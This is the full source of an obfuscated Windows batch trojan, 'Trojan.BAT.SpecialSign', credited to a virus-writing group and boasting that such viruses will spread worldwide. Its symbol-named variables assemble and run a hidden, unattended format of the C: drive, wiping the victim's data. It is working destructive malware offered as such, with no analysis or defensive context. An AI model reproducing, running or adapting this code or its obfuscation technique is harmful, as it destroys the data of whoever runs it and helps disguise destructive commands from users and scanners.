ReM Trojan.BAT.SpecialSign
ReM by SeCoNd PaRt To HeLl
ReM www.spth.de.vu
ReM Such viruses will flood over the world...
set µµ_(=s
%µµ_(%et :.:.:=e
%µµ_(%%:.:.:%t @@@=t
%µµ_(%%:.:.:%%@@@% .:.:.=%µµ_(%%:.:.:%%@@@%
%.:.:.% ההצהצüצü=o
%.:.:.% @_@=rm
%.:.:.% @@=fo
%.:.:.% .-.-=C
%.:.:.% ...=at
%.:.:.% ____=x
%.:.:.% _____=i
%.:.:.% ....=:
%.:.:.% הצüצהüצü=a
%.:.:.% הצהצהüצü=q
%.:.:.% הצüהצüהצ=/
%.:.:.% üהצüהצüצ=u

%.:.:.% @=%@@%%@_@%%...% %.-.-%%....% %הצüהצüהצ%%üהצüהצüצ% %הצüהצüהצ%%הצהצהüצü% %הצüהצüהצ%%הצüצהüצü%%üהצüהצüצ%%@@@%%ההצהצüצü%%@@@%%:.:.:%%µµ_(%%@@@%
%@%
%:.:.:%%____%%_____%%@@@%